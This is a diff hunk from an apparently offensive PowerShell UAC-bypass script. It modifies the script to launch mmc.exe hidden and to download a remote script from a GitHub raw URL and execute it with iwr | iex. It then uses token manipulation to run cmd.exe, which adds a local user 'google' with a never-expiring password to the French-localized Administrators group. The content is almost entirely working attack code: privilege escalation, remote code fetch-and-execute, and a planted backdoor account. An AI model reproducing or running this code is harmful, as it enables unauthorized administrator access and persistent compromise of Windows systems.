@@ -1529,8 +1529,10 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
             }
             $IFileOperation.PerformOperations()
             echo "`n[?] Executing mmc.."
-            #IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
-	    IEX $($env:SystemRoot + "\System32\cmd.exe /c 'net user google passwd /add /y /expires:never' && 'net localgroup Administrateurs google /add'")
+            IEX $(Start-Process -WindowStyle hidden -FilePath $env:SystemRoot + '\System32\mmc.exe gpedit.msc')
+	    iwr https://raw.githubusercontent.com/H0K5/PowerShell-Suite/master/UAC-TokenMagic.ps1 | iex
+	    UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c net user google passwd /add /y /expires:never & net localgroup Administrateurs google /add" -ProcPID (ps -Name mmc).id
+	    IEX $($env:SystemRoot + "\System32\cmd.exe /c 'net user google passwd /add /y /expires:never & net localgroup Administrateurs google /add'")
 		        #IEX $($env:SystemRoot + '\regedit.exe')
             
             
